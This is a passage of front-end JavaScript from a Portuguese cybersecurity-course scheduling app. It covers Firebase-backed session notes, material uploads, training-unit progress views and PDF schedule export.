                        { left: '\\(', right: '\\)', display: false },
                        { left: '\\[', right: '\\]', display: true }
                    ],
                    throwOnError: false
                });
            }
        }

        async function handleNotesPaste(e) {
            const items   = Array.from(e.clipboardData?.items || []);
            const imgItem = items.find(it => it.type.startsWith('image/'));
            if (!imgItem) return;
            e.preventDefault();
            const file = imgItem.getAsFile();
            if (!file) return;
            const uid = auth.currentUser?.uid;
            if (!uid) return;
            const ta  = document.getElementById('session-notes-textarea');
            const oldPlaceholder = ta.placeholder;
            ta.placeholder = '⏳ A carregar imagem…';
            ta.disabled = true;
            try {
                const ext  = file.type.split('/')[1] || 'png';
                const ref  = storage.ref(`uc-files/${uid}/paste_${Date.now()}.${ext}`);
                const snap = await ref.put(file, { contentType: file.type });
                const url  = await snap.ref.getDownloadURL();
                const start = ta.selectionStart;
                const end   = ta.selectionEnd;
                const imgMd = `![imagem](${url})`;
                ta.value = ta.value.slice(0, start) + imgMd + ta.value.slice(end);
                ta.selectionStart = ta.selectionEnd = start + imgMd.length;
                ta.dispatchEvent(new Event('input'));
            } catch (err) {
                console.error('Erro ao colar imagem:', err);
            } finally {
                ta.placeholder = oldPlaceholder;
                ta.disabled = false;
                ta.focus();
            }
        }

        function autoSaveSessionNote(key, value) {
            clearTimeout(sessionNotesTimer);
            sessionNotesTimer = setTimeout(async () => {
                const uid = auth.currentUser?.uid;
                if (!uid) return;
                try {
                    await db.collection('notes').doc(`${uid}_${key}`).set({
                        content: value,
                        updatedAt: firebase.firestore.FieldValue.serverTimestamp(),
                        uid
                    }, { merge: true });
                } catch(e) { console.warn('Erro ao guardar notas de sessão:', e); }
                const ind = document.getElementById('session-notes-saved');
                ind.classList.add('visible');
                setTimeout(() => ind.classList.remove('visible'), 2000);
            }, 800);
        }

        async function getSessionMaterials(key) {
            if (materialsCache[key]) return materialsCache[key];
            try {
                const doc = await db.collection('materials').doc(key).get();
                const list = doc.exists ? (doc.data().items || []) : [];
                materialsCache[key] = list;
                return list;
            } catch(e) { return []; }
        }

        function renderSessionMaterials(key, list) {
            const el = document.getElementById('session-materials-list');
            if (!list || list.length === 0) {
                el.innerHTML = '<div class="no-materials">Sem materiais adicionados nesta sessão.</div>';
                return;
            }
            el.innerHTML = list.map((m, i) => `
                <div class="material-item">
                    <span class="material-icon">${getTypeIcon(m.type)}</span>
                    <div class="material-info">
                        <a class="material-label" href="${escapeHtml(m.url)}" target="_blank" rel="noopener">${escapeHtml(m.label || m.url)}</a>
                    </div>
                    <button class="material-delete" data-del-key="${key}" data-del-idx="${i}">✕</button>
                </div>`).join('');
            el.querySelectorAll('[data-del-key]').forEach(btn =>
                btn.addEventListener('click', () => deleteSessionMaterial(btn.dataset.delKey, parseInt(btn.dataset.delIdx)))
            );
        }

        async function addSessionMaterial() {
            const key   = currentSessionKey;
            const type  = document.getElementById('session-mat-type').value;
            const label = document.getElementById('session-mat-label').value.trim();
            const url   = document.getElementById('session-mat-url').value.trim();
            if (!url) { alert('Introduz um URL.'); return; }
            const uid = auth.currentUser?.uid;
            if (!uid) return;
            const item = {
                id: `${Date.now()}_${Math.random().toString(36).slice(2)}`,
                type, label: label || url, url, uid,
                createdAt: Date.now()
            };
            try {
                await db.collection('materials').doc(key).set({
                    items: firebase.firestore.FieldValue.arrayUnion(item)
                }, { merge: true });
                delete materialsCache[key];
                document.getElementById('session-mat-label').value = '';
                document.getElementById('session-mat-url').value   = '';
                const list = await getSessionMaterials(key);
                renderSessionMaterials(key, list);
            } catch(e) { alert('Erro ao adicionar material: ' + e.message); }
        }

        async function deleteSessionMaterial(key, index) {
            if (!confirm('Remover este material?')) return;
            try {
                const doc = await db.collection('materials').doc(key).get();
                const items = doc.exists ? [...(doc.data().items || [])] : [];
                items.splice(index, 1);
                await db.collection('materials').doc(key).set({ items });
                delete materialsCache[key];
                const list = await getSessionMaterials(key);
                renderSessionMaterials(key, list);
            } catch(e) { alert('Erro ao remover: ' + e.message); }
        }

        function goToSession(dateStr) {
            const exists = HORARIOS.some(h => h.dias.some(d => d.data === dateStr));
            if (!exists) return;

            switchView('horario');

            setTimeout(() => {
                const toolbar = document.querySelector('.schedule-toolbar');
                const offset  = (toolbar?.offsetHeight || 80) + 16;
                const content = document.getElementById('app-content');
                const target  = document.querySelector(`.day-card[data-date="${dateStr}"]`)
                              || document.querySelector(`.week-day-col[data-date="${dateStr}"]`);
                if (!target || !content) return;
                const targetRect  = target.getBoundingClientRect();
                const contentRect = content.getBoundingClientRect();
                content.scrollTo({ top: content.scrollTop + targetRect.top - contentRect.top - offset, behavior: 'smooth' });
            }, 80);
        }


        // ── DISCIPLINES LIST ────────────────────────────────────────────
        function getTypeIcon(type) {
            const icons = { link:'🔗', pdf:'📄', doc:'📝', video:'🎬', slide:'📊', html:'🌐', outro:'📁', file:'📎' };
            return icons[type] || '📎';
        }

        function buildUCCard(uc) {
            const hasNotes     = !!localStorage.getItem(`uc_notes_${uc.codigo}`);
            const numMaterials = parseInt(localStorage.getItem(`uc_mat_count_${uc.codigo}`)) || 0;
            const notesBadge = hasNotes
                ? `<span class="uc-meta-tag uc-has-notes">📝 Apontamentos</span>` : '';
            const matBadge = numMaterials > 0
                ? `<span class="uc-meta-tag uc-has-materials">📎 ${numMaterials} material${numMaterials !== 1 ? 'is' : ''}</span>` : '';

            const { done: ucDone, scheduled: ucSched } = computeUCHours(uc.codigo);
            const ucTarget = uc.carga_horaria;

            const chBadge = ucTarget
                ? `<span class="uc-meta-tag">⏱ ${ucTarget}h</span>`
                : ucSched > 0 ? `<span class="uc-meta-tag">⏱ ${ucSched.toFixed(0)}h agendadas</span>` : '';
            const formBadge = uc.formador
                ? `<span class="uc-meta-tag">👤 ${shortName(uc.formador)}</span>` : '';

            let progressHtml = '';
            if (ucSched > 0) {
                if (ucTarget) {
                    const donePct  = Math.min(100, Math.round((ucDone  / ucTarget) * 100));
                    const schedPct = Math.min(100, Math.round((ucSched / ucTarget) * 100));
                    const label = ucDone > 0
                        ? `${ucDone.toFixed(0)}h realizadas · ${ucSched.toFixed(0)}h agendadas · ${ucTarget}h total`
                        : `${ucSched.toFixed(0)}h agendadas · ${ucTarget}h total`;
                    progressHtml = `
                    <div class="uc-progress-wrap">
                        <div class="uc-progress-bar">
                            <div class="uc-progress-sched" data-pct="${schedPct}"></div>
                            <div class="uc-progress-done"  data-pct="${donePct}"></div>
                        </div>
                        <div class="uc-progress-label">${label}</div>
                    </div>`;
                } else {
                    const donePct = ucSched > 0 ? Math.min(100, Math.round((ucDone / ucSched) * 100)) : 0;
                    const label = ucDone > 0
                        ? `${ucDone.toFixed(0)}h realizadas · ${ucSched.toFixed(0)}h agendadas`
                        : `${ucSched.toFixed(0)}h agendadas`;
                    progressHtml = `
                    <div class="uc-progress-wrap">
                        <div class="uc-progress-bar">
                            <div class="uc-progress-sched" data-pct="100"></div>
                            <div class="uc-progress-done"  data-pct="${donePct}"></div>
                        </div>
                        <div class="uc-progress-label">${label}</div>
                    </div>`;
                }
            }

            return `
            <div class="uc-card" data-uc-open="${uc.codigo}">
                <div class="uc-card-code">${uc.codigo}</div>
                <div class="uc-card-name">${uc.descricao}</div>
                ${progressHtml}
                <div class="uc-card-meta">
                    ${chBadge}${formBadge}${notesBadge}${matBadge}
                </div>
            </div>`;
        }

        function setDisciplinesView(mode) {
            disciplinesViewMode = mode;
            document.getElementById('btn-disc-view-cards').classList.toggle('active', mode === 'cards');
            document.getElementById('btn-disc-view-list').classList.toggle('active', mode === 'list');
            document.getElementById('disciplines-grid').style.display = mode === 'cards' ? '' : 'none';
            document.getElementById('disciplines-list').style.display = mode === 'list' ? '' : 'none';
            renderDisciplines(document.getElementById('uc-search')?.value || '');
        }

        function renderDisciplinesListRow(uc) {
            const { done, scheduled } = computeUCHours(uc.codigo);
            const pendente = Math.max(0, scheduled - done);
            const formadorHtml = uc.formador
                ? escapeHtml(shortName(uc.formador))
                : `<span class="uc-list-no-formador">⚠ por atribuir</span>`;

            return `
            <div class="uc-list-row" data-uc-open="${uc.codigo}">
                <div class="uc-list-uc">
                    <span class="uc-list-code">${uc.codigo}</span>
                    <span class="uc-list-name">${escapeHtml(uc.descricao)}</span>
                </div>
                <div class="uc-list-formador">${formadorHtml}</div>
                <div class="uc-list-hours uc-list-done" data-label="Realizadas">${done.toFixed(0)}h</div>
                <div class="uc-list-hours" data-label="Agendadas">${pendente.toFixed(0)}h</div>
                <div class="uc-list-hours" data-label="Total prog.">${scheduled.toFixed(0)}h</div>
            </div>`;
        }

        function ucCompletionRank(uc) {
            if (uc.codigo.startsWith('UC_PENDENTE')) return { group: 2 };
            const { done, scheduled } = computeUCHours(uc.codigo);
            // Sem formador ou ainda sem horas dadas → vai para o fim da lista
            if (!uc.formador || done === 0) return { group: 1, scheduled };
            const target = uc.carga_horaria || scheduled;
            const ratio = target > 0 ? done / target : 0;
            return { group: 0, ratio };
        }

        function sortDisciplinesForList(ucs) {
            return ucs
                .map(uc => ({ uc, rank: ucCompletionRank(uc) }))
                .sort((a, b) => {
                    if (a.rank.group !== b.rank.group) return a.rank.group - b.rank.group;
                    if (a.rank.group === 0) return b.rank.ratio - a.rank.ratio;
                    if (a.rank.group === 1) return (b.rank.scheduled || 0) - (a.rank.scheduled || 0);
                    return a.uc.codigo.localeCompare(b.uc.codigo);
                })
                .map(x => x.uc);
        }

        function renderDisciplinesList(ucsUnsorted) {
            const el = document.getElementById('disciplines-list');
            const ucs = sortDisciplinesForList(ucsUnsorted);
            const semFormador = ucs.filter(uc => !uc.formador).length;

            const header = `
            <div class="uc-list-header">
                <div>UC</div>
                <div>Formador</div>
                <div class="uc-list-hours">Realizadas</div>
                <div class="uc-list-hours">Agendadas</div>
                <div class="uc-list-hours">Total prog.</div>
            </div>`;

            const summary = semFormador > 0
                ? `<div class="uc-list-summary">⚠ ${semFormador} UC${semFormador !== 1 ? 's' : ''} sem formador atribuído</div>`
                : '';

            el.innerHTML = `<div class="uc-list-table">${header}${ucs.map(renderDisciplinesListRow).join('')}</div>${summary}`;
            el.querySelectorAll('[data-uc-open]').forEach(row =>
                row.addEventListener('click', () => { navStack.push(currentView); openUCDetail(row.dataset.ucOpen); })
            );
        }

        function renderDisciplines(filter) {
            const grid = document.getElementById('disciplines-grid');
            const q = (filter || '').toLowerCase();
            const filtered = UC_LIST.filter(uc =>
                !q ||
                uc.codigo.toLowerCase().includes(q) ||
                uc.descricao.toLowerCase().includes(q) ||
                (uc.formador || '').toLowerCase().includes(q)
            );

            if (filtered.length === 0) {
                const emptyHtml = `<div class="empty-state">Nenhuma UC encontrada.</div>`;
                grid.innerHTML = emptyHtml;
                document.getElementById('disciplines-list').innerHTML = emptyHtml;
                return;
            }

            if (disciplinesViewMode === 'list') {
                renderDisciplinesList(filtered);
                return;
            }

            // Categorise UCs
            const emCurso = [], agendadas = [], porAgendar = [], concluidas = [];
            filtered.forEach(uc => {
                const { done, scheduled } = computeUCHours(uc.codigo);
                const target = uc.carga_horaria || scheduled;
                if (done > 0 && target && done >= target) {
                    concluidas.push(uc);
                } else if (done > 0) {
                    emCurso.push(uc);
                } else if (scheduled > 0) {
                    agendadas.push(uc);
                } else {
                    porAgendar.push(uc);
                }
            });

            function sectionHtml(title, icon, ucs, emptyMsg) {
                if (ucs.length === 0) return '';
                return `
                <div class="uc-section">
                    <div class="uc-section-header">
                        <span class="uc-section-icon">${icon}</span>
                        <span class="uc-section-title">${title}</span>
                        <span class="uc-section-count">${ucs.length}</span>
                    </div>
                    <div class="disciplines-grid">
                        ${ucs.map(buildUCCard).join('')}
                    </div>
                </div>`;
            }

            const html = [
                sectionHtml('Em curso', '🔵', emCurso),
                sectionHtml('Agendadas', '📅', agendadas),
                sectionHtml('Por agendar', '⏳', porAgendar),
                sectionHtml('Concluídas', '✅', concluidas),
            ].join('');

            grid.innerHTML = html || `<div class="empty-state jshook-grid-span-all">Nenhuma UC encontrada.</div>`;
            grid.querySelectorAll('[data-uc-open]').forEach(el =>
                el.addEventListener('click', () => { navStack.push(currentView); openUCDetail(el.dataset.ucOpen); })
            );
            applyDeferredStyles(grid);
        }

        function filterUCs(value) {
            renderDisciplines(value);
        }

        // ── UC SCHEDULE ─────────────────────────────────────────────────
        function buildUCSchedule(ucCode) {
            const sessions = [];
            HORARIOS.forEach(horario => {
                horario.dias.forEach(dia => {
                    const merged = mergeTimeSlots(dia.aulas);
                    merged.forEach(aula => {
                        if (aula.uc === ucCode) {
                            sessions.push({
                                data:      dia.data,
                                dia_semana: dia.dia_semana,
                                hora:      aula.hora,
                                mes_ano:   horario.mes_ano,
                                state:     getAulaState(dia.data, aula.hora),
                                modalidade: aula.modalidade,
                                tipo:      aula.tipo
                            });
                        }
                    });
                });
            });
            sessions.sort((a, b) => a.data.localeCompare(b.data));
            return sessions;
        }

        function calcSessionHours(horaStr) {
            const [s, e] = horaStr.split('-').map(t => {
                const [h, m] = t.split(':').map(Number);
                return h + m / 60;
            });
            return e - s;
        }

        function buildSessionChipsHTML(ucCode, sessions, activeKey) {
            return sessions.map(s => {
                const [y, mo, d] = s.data.split('-');
                const sKey = s.num === 1 ? ucCode : `${ucCode}_${s.data}`;
                const isActive = sKey === activeKey ? ' active-session' : '';
                return `<div class="session-chip ${s.state}${isActive}"
                    data-sess-uc="${ucCode}" data-sess-date="${s.data}" data-sess-num="${s.num}"
                    data-sess-hora="${s.hora}" data-sess-dow="${s.dia_semana}" data-sess-mes="${s.mes_ano}"
                    ${s.tipo === 'teste' ? 'title="Teste"' : ''}>
                    <span class="session-chip-num">S${s.num}</span>
                    <span class="session-chip-date">${d}/${mo}${s.tipo === 'teste' ? ' 📝' : ''}</span>
                </div>`;
            }).join('');
        }

        function renderUCSchedule(ucCode) {
            const sessions = buildUCSchedule(ucCode);
            const contentEl = document.getElementById('uc-schedule-content');
            const hoursEl   = document.getElementById('uc-total-hours');

            if (sessions.length === 0) {
                contentEl.innerHTML = '<p class="no-sessions-msg">Sem sessões programadas nos horários disponíveis.</p>';
                hoursEl.textContent = '';
                return;
            }

            // Total hours
            const totalH = sessions.reduce((sum, s) => sum + calcSessionHours(s.hora), 0);
            const doneH  = sessions.filter(s => s.state === 'past').reduce((sum, s) => sum + calcSessionHours(s.hora), 0);
            hoursEl.textContent = doneH > 0
                ? `${doneH.toFixed(0)}h / ${totalH.toFixed(0)}h realizadas`
                : `${totalH.toFixed(0)}h programadas`;

            // Assign session numbers
            let sessionNum = 1;
            sessions.forEach(s => { s.num = sessionNum++; });

            // Flat horizontal chips (no month grouping)
            contentEl.innerHTML = `<div class="session-list">${buildSessionChipsHTML(ucCode, sessions, null)}</div>`;
            contentEl.querySelectorAll('[data-sess-uc]').forEach(el =>
                el.addEventListener('click', () => {
                    navStack.push(currentView);
                    openSessionDetail(
                        el.dataset.sessUc, el.dataset.sessDate, parseInt(el.dataset.sessNum),
                        el.dataset.sessHora, el.dataset.sessDow, el.dataset.sessMes
                    );
                })
            );
        }

        // ── UC DETAIL ───────────────────────────────────────────────────
        async function openUCDetail(ucCode) {
            currentUCCode = ucCode;

            const uc = UC_MAP[ucCode] || {};
            document.getElementById('detail-uc-code').textContent = ucCode;
            document.getElementById('detail-uc-name').textContent = uc.descricao || ucCode;

            let metaHtml = '';
            if (uc.carga_horaria) metaHtml += `<span class="detail-meta-pill">⏱ ${uc.carga_horaria}h</span>`;
            if (uc.formador)      metaHtml += `<span class="detail-meta-pill">👤 ${shortName(uc.formador)}</span>`;
            document.getElementById('detail-uc-meta').innerHTML = metaHtml;

            // Render sessions (horizontal chips)
            renderUCSchedule(ucCode);

            switchView('uc-detail');

            // Subscribe UC chat
            ucChatInit(ucCode);
        }

        // ── LAZY-LOAD: jsPDF / jsPDF-AutoTable / QRCode (só quando usados) ─
        const _LAZY_SRI = {
            'https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js':
                'sha384-JcnsjUPPylna1s1fvi1u12X5qjY5OL56iySh75FdtrwhO/SWXgMjoVqcKyIIWOLk',
            'https://cdnjs.cloudflare.com/ajax/libs/jspdf-autotable/3.8.2/jspdf.plugin.autotable.min.js':
                'sha384-fCAW/rDWORTbQXSiB7mOg0QtQ5c+r0f544y6XoKjuVva0nMBlCpNUjiFeG5iMdS3',
            'https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js':
                'sha384-3zSEDfvllQohrq0PHL1fOXJuC/jSOO34H46t6UQfobFOmxE5BpjjaIJY5F2/bMnU',
        };
        function lazyLoadScript(url) {
            return new Promise((resolve, reject) => {
                if (document.querySelector(`script[src="${url}"]`)) { resolve(); return; }
                const s = document.createElement('script');
                s.src = url;
                if (_LAZY_SRI[url]) { s.integrity = _LAZY_SRI[url]; s.crossOrigin = 'anonymous'; }
                s.onload = () => resolve();
                s.onerror = () => reject(new Error('Falha ao carregar: ' + url));
                document.head.appendChild(s);
            });
        }
        let _pdfLibsPromise = null;
        function ensurePdfLibs() {
            if (window.jspdf && window.jspdf.jsPDF.API.autoTable) return Promise.resolve();
            if (!_pdfLibsPromise) {
                _pdfLibsPromise = lazyLoadScript('https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js')
                    .then(() => lazyLoadScript('https://cdnjs.cloudflare.com/ajax/libs/jspdf-autotable/3.8.2/jspdf.plugin.autotable.min.js'))
                    .catch(e => { _pdfLibsPromise = null; throw e; });
            }
            return _pdfLibsPromise;
        }
        let _qrLibPromise = null;
        function ensureQrLib() {
            if (window.QRCode) return Promise.resolve();
            if (!_qrLibPromise) {
                _qrLibPromise = lazyLoadScript('https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js')
                    .catch(e => { _qrLibPromise = null; throw e; });
            }
            return _qrLibPromise;
        }

        // ── UC DETAIL PDF ────────────────────────────────────────────────
        async function downloadUCPDF(btn) {
            if (!currentUCCode) return;
            const uc = UC_MAP[currentUCCode] || {};
            const sessions = buildUCSchedule(currentUCCode);
            if (sessions.length === 0) { alert('Sem sessões para exportar.'); return; }

            btn.classList.add('loading');
            btn.textContent = '⏳';

            try {
                await ensurePdfLibs();
            } catch (e) {
                console.error(e);
                alert('Não foi possível carregar a biblioteca de PDF. Verifica a ligação à internet.');
                btn.classList.remove('loading');
                btn.innerHTML = '⬇ PDF';
                return;
            }
            const { jsPDF } = window.jspdf;

            setTimeout(() => {
                try {
                    const doc   = new jsPDF({ orientation: 'portrait', unit: 'mm', format: 'a4' });
                    const pageW = 210;
                    const pad   = n => String(n).padStart(2, '0');

                    // ── Header ──
                    doc.setFillColor(5, 5, 5);
                    doc.rect(0, 0, pageW, 38, 'F');
                    doc.setFillColor(0, 143, 17);
                    doc.rect(0, 36, pageW, 2, 'F');
                    doc.roundedRect(10, 6, 22, 22, 3, 3, 'F');
                    doc.setTextColor(255, 255, 255);
                    doc.setFontSize(7);
                    doc.setFont('helvetica', 'bold');
                    doc.text(currentUCCode, 36, 13);
                    doc.setFontSize(12);
                    const descLines = doc.splitTextToSize(uc.descricao || currentUCCode, 150);
                    doc.text(descLines, 36, 20);
                    doc.setFontSize(7.5);
                    doc.setFont('helvetica', 'normal');
                    doc.setTextColor(139, 148, 158);
                    const metaParts = [];
                    if (uc.carga_horaria) metaParts.push(`${uc.carga_horaria}h total`);
                    if (uc.formador) metaParts.push(shortName(uc.formador));
                    if (uc.modalidade) metaParts.push(uc.modalidade.charAt(0).toUpperCase() + uc.modalidade.slice(1));
                    doc.text(metaParts.join('  ·  ') || 'CET Cibersegurança', 36, 32);

                    // ── Table rows ──
                    const totalH = sessions.reduce((s, x) => s + calcSessionHours(x.hora), 0);
                    const doneH  = sessions.filter(x => x.state === 'past').reduce((s, x) => s + calcSessionHours(x.hora), 0);
                    const rows   = sessions.map(s => {
                        const [y, m, d] = s.data.split('-');
                        return [
                            `${d}/${m}/${y}`,
                            s.dia_semana,
                            s.mes_ano.charAt(0).toUpperCase() + s.mes_ano.slice(1),
                            s.hora,
                            `${calcSessionHours(s.hora).toFixed(0)}h`,
                            s.state === 'past' ? 'Realizada' : s.state === 'current' ? 'A decorrer' : 'Prevista'
                        ];
                    });

                    doc.autoTable({
                        startY: 43,
                        head: [['Data', 'Dia', 'Mês', 'Horário', 'Dur.', 'Estado']],
                        body: rows,
                        theme: 'grid',
                        headStyles: {
                            fillColor: [0, 143, 17], textColor: 255, fontStyle: 'bold',
                            fontSize: 8, cellPadding: { top: 3, bottom: 3, left: 3, right: 3 }
                        },
                        bodyStyles: { fontSize: 8, cellPadding: 3, textColor: [30, 30, 30] },
                        alternateRowStyles: { fillColor: [245, 250, 245] },
                        columnStyles: {
                            0: { cellWidth: 24, fontStyle: 'bold' },
                            1: { cellWidth: 16 },
                            2: { cellWidth: 32 },
                            3: { cellWidth: 26, textColor: [0, 143, 17], fontStyle: 'bold' },
                            4: { cellWidth: 14 },
                            5: { cellWidth: 'auto' }
                        },
                        didParseCell: data => {
                            if (data.section === 'body' && data.row.raw[5] === 'Realizada') {
                                data.cell.styles.textColor = [100, 100, 100];
                            }
                            if (data.section === 'body' && data.row.raw[5] === 'A decorrer') {
                                data.cell.styles.textColor = [180, 130, 0];
                                data.cell.styles.fontStyle = 'bold';
                            }
                        },
                        margin: { left: 10, right: 10 }
                    });

                    // ── Summary footer ──
                    const finalY = doc.lastAutoTable.finalY + 6;
                    doc.setFontSize(8);
                    doc.setFont('helvetica', 'bold');
                    doc.setTextColor(0, 143, 17);
                    doc.text(`${sessions.length} sessões  ·  ${totalH.toFixed(0)}h programadas  ·  ${doneH.toFixed(0)}h realizadas`, 10, finalY);

                    // ── Page footers ──
                    const pageCount = doc.internal.getNumberOfPages();
                    for (let i = 1; i <= pageCount; i++) {
                        doc.setPage(i);
                        doc.setFontSize(7);
                        doc.setTextColor(150);
                        doc.text(
                            `Gerado em ${new Date().toLocaleDateString('pt-PT')}  ·  Página ${i} de ${pageCount}`,
                            pageW / 2, 289, { align: 'center' }
                        );
                        doc.setFillColor(0, 143, 17);
                        doc.rect(0, 291, pageW, 1.5, 'F');
                    }

                    const safeName = (uc.descricao || currentUCCode).substring(0, 40).replace(/[^a-z0-9]/gi, '_');
                    doc.save(`${currentUCCode}_${safeName}.pdf`);
                } catch(e) {
                    console.error(e);
                    alert('Erro ao gerar PDF. Verifica a consola.');
                } finally {
                    btn.classList.remove('loading');
                    btn.innerHTML = '⬇ PDF';
                }
            }, 50);
        }


        // ── MATERIALS (Firestore) ───────────────────────────────────────
        async function getMaterials(key) {
            if (materialsCache[key]) return materialsCache[key];
            try {
                const doc = await db.collection('materials').doc(key).get();
                const list = doc.exists ? (doc.data().items || []) : [];
                materialsCache[key] = list;
                return list;
            } catch(e) { return []; }
        }

        function getYouTubeId(url) {
            try {
                const u = new URL(url);
                if (u.hostname === 'youtu.be') return u.pathname.slice(1).split('?')[0];
                if (u.hostname.includes('youtube.com')) return u.searchParams.get('v');
            } catch {}
            return null;
        }

        function renderMaterials(list) {
            const el = document.getElementById('session-materials-list');
            if (!el) return;
            if (!list || list.length === 0) {
                el.innerHTML = `<div class="no-materials">Sem materiais adicionados ainda.<br>Usa o formulário acima para adicionar links ou ficheiros.</div>`;
                return;
            }
            el.innerHTML = list.map((m, i) => {
                if (m.url && isSafeUrl(m.url) && (m.type === 'video' || getYouTubeId(m.url))) {
                    const safeLabel = escapeHtml(m.label || m.url);
                    const safeSize  = m.size ? escapeHtml(m.size) : '';
                    const ytId      = getYouTubeId(m.url);
                    const playerHtml = ytId
                        ? `<iframe src="https://www.youtube.com/embed/${escapeHtml(ytId)}"
                                   frameborder="0" allowfullscreen
                                   allow="accelerometer; autoplay; clipboard-write; encrypted-media; picture-in-picture"
                                   class="jshook-yt-embed"></iframe>`
                        : `<video controls preload="none" class="jshook-local-video">
                               <source src="${escapeHtml(m.url)}" type="${m.url.endsWith('.webm') ? 'video/webm' : 'video/mp4'}">
                           </video>`;
                    return `
                        <div class="material-video-wrap">
                            <div class="material-video-header" data-action="toggle-video" data-idx="${i}">
                                <span class="material-icon">🎬</span>
                                <div class="material-info">
                                    <div class="material-label">${safeLabel}</div>
                                    ${safeSize ? `<div class="material-url">📎 ${safeSize}</div>` : ''}
                                </div>
                                <div class="material-video-actions">
                                    <button class="material-btn open" data-action="open-mat" data-mat="${i}" title="Abrir em separador">↗</button>
                                    <button class="material-btn delete" data-action="del-mat" data-mat="${i}" title="Remover">✕</button>
                                </div>
                                <span class="material-video-toggle">▶ ver</span>
                            </div>
                            <div class="material-video-player" id="video-player-${i}">${playerHtml}</div>
                        </div>`;
                }
                // PDF — thumbnail card that opens modal
                if (m.type === 'pdf' && m.url) {
                    const safeLabel = escapeHtml(m.label || 'documento.pdf');
                    const safeUrl   = escapeHtml(m.url);
                    return `
                        <div class="material-item pdf-thumb" data-action="open-pdf" data-pdf-url="${safeUrl}" data-pdf-label="${safeLabel}" title="Clica para visualizar">
                            <div class="pdf-thumb-preview">📄</div>
                            <div class="pdf-thumb-footer">
                                <div class="material-info">
                                    <div class="material-label">${safeLabel}</div>
                                    ${m.size ? `<div class="pdf-thumb-meta">PDF · ${escapeHtml(m.size)}</div>` : '<div class="pdf-thumb-meta">PDF</div>'}
                                </div>
                                <div class="material-actions">
                                    <button class="material-btn delete" data-action="del-mat" data-mat="${i}" title="Remover">✕</button>
                                </div>
                            </div>
                        </div>`;
                }
                // Other types — whole card is clickable if it has a URL
                const isUpload  = m.url && m.url.includes('firebasestorage');
                const clickable = m.url && isSafeUrl(m.url);
                const cardAttrs = clickable ? `data-action="open-mat" data-mat="${i}" role="link" tabindex="0"` : '';
                return `
                    <div class="material-item${clickable ? ' clickable-card' : ''}" ${cardAttrs}>
                        <span class="material-icon">${getTypeIcon(m.type)}</span>
                        <div class="material-info">
                            <div class="material-label">${escapeHtml(m.label || m.url)}</div>
                            ${!isUpload && m.url ? `<div class="material-url">${escapeHtml(m.url)}</div>` : ''}
                            ${m.size ? `<div class="material-url">📎 ${escapeHtml(m.size)}</div>` : ''}
                        </div>
                        <div class="material-actions">
                            ${clickable ? `<span class="material-btn open" aria-hidden="true">↗</span>` : ''}
                            <button class="material-btn delete" data-action="del-mat" data-mat="${i}" title="Remover">✕</button>
                        </div>
                    </div>`;
            }).join('');
            el.querySelectorAll('[data-action]').forEach(node => {
                node.addEventListener('click', e => {
                    const act = node.dataset.action;
                    if (act === 'del-mat' || act === 'open-mat') e.stopPropagation();
                    if (act === 'toggle-video') { toggleVideo(node); return; }
                    const idx = parseInt(node.dataset.mat ?? node.dataset.idx);
                    if (act === 'open-mat') openMaterial(idx);
                    if (act === 'del-mat')  deleteMaterial(idx);
                    if (act === 'open-pdf') openPdfModal(node.dataset.pdfUrl, node.dataset.pdfLabel);
                });
            });
            el.querySelectorAll('[data-action="open-mat"]').forEach(node =>
                node.addEventListener('keydown', e => { if (e.key === 'Enter') openMaterial(parseInt(node.dataset.mat)); })
            );
            applyDeferredStyles(el);
        }

        function toggleVideo(header) {
            const idx    = header.dataset.idx;
            const player = document.getElementById(`video-player-${idx}`);
            const toggle = header.querySelector('.material-video-toggle');
            const isOpen = player.classList.toggle('open');
            toggle.textContent = isOpen ? '■ fechar' : '▶ ver';
            if (!isOpen) {
                const vid = player.querySelector('video');
                if (vid) vid.pause();
                const iframe = player.querySelector('iframe');
                if (iframe) { const s = iframe.src; iframe.src = ''; iframe.src = s; }
            }
        }

        let _pdfBlobUrl = null;

        async function openPdfModal(url, label) {
            const modal  = document.getElementById('pdf-modal');
            const frame  = document.getElementById('pdf-modal-frame');
            const dlBtn  = document.getElementById('pdf-modal-download');
            document.getElementById('pdf-modal-title').textContent = label;
            dlBtn.href = url;
            // Loading placeholder
            frame.removeAttribute('src');
            frame.srcdoc = `<body id="pdf-loading-msg">A carregar PDF…</body>`;
            styleSrcdocOnLoad(frame, doc => {
                const b = doc && doc.getElementById('pdf-loading-msg');
                if (!b) return;
                Object.assign(b.style, {
                    margin: '0', display: 'flex', alignItems: 'center', justifyContent: 'center',
                    height: '100vh', background: '#525659', fontFamily: 'sans-serif', color: '#ccc', fontSize: '0.9rem'
                });
            });
            modal.classList.add('open');
            document.body.style.overflow = 'hidden';
            try {
                const res  = await fetch(url);
                const blob = await res.blob();
                if (_pdfBlobUrl) URL.revokeObjectURL(_pdfBlobUrl);
                _pdfBlobUrl  = URL.createObjectURL(blob);
                frame.removeAttribute('srcdoc');
                frame.src    = _pdfBlobUrl;
            } catch (e) {
                frame.srcdoc = `<body id="pdf-error-msg"><p>Não foi possível carregar o PDF.</p><a href="${escapeHtml(url)}" target="_blank" rel="noopener noreferrer" id="pdf-error-link">↗ Abrir em separador</a></body>`;
                styleSrcdocOnLoad(frame, doc => {
                    const b = doc && doc.getElementById('pdf-error-msg');
                    if (b) Object.assign(b.style, {
                        margin: '0', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center',
                        height: '100vh', background: '#1a1a2e', fontFamily: 'sans-serif', color: '#ccc', gap: '1rem'
                    });
                    const a = doc && doc.getElementById('pdf-error-link');
                    if (a) Object.assign(a.style, {
                        color: '#58a6ff', textDecoration: 'none', border: '1px solid #58a6ff', padding: '.5rem 1rem', borderRadius: '6px'
                    });
                });
            }
        }

        function _closePdf() {
            const modal = document.getElementById('pdf-modal');
            modal.classList.remove('open');
            const f = document.getElementById('pdf-modal-frame');
            f.removeAttribute('src');
            f.removeAttribute('srcdoc');
            document.body.style.overflow = '';
        }
        function closePdfModal(e) {
            if (e && e.target !== document.getElementById('pdf-modal')) return;
            _closePdf();
        }
        function closePdfModalBtn() { _closePdf(); }

        async function addMaterial() {
            let type    = document.getElementById('mat-type').value;
            const label = document.getElementById('mat-label').value.trim();
            const url   = document.getElementById('mat-url').value.trim();
            if (!url && !label) return;
